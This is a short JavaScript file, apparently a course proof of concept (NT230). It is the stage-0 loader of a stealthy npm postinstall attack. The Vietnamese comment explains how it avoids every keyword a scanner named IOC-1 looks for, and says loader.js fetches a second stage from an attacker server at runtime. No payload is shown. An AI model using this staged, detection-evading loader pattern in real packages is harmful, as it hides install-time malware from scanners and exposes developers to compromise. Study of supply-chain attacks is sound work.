/**
 * [PoC - NT230] Stealth postinstall — Stage 0 (Clean Loader)
 *
 * File này trông hoàn toàn vô hại: chỉ require 1 module rồi gọi.
 * Không chứa bất kỳ keyword nào mà IOC-1 tìm kiếm:
 *   - Không có process.env
 *   - Không có TOKEN, SECRET, KEY, PASSWORD
 *   - Không có require("http")
 *   - Không có exec/spawn/eval
 *
 * IOC-1 quét file này → CLEAN → bỏ qua.
 * Nhưng loader.js sẽ fetch stage 2 từ attacker server lúc runtime.
 */

"use strict";

require("./loader")();
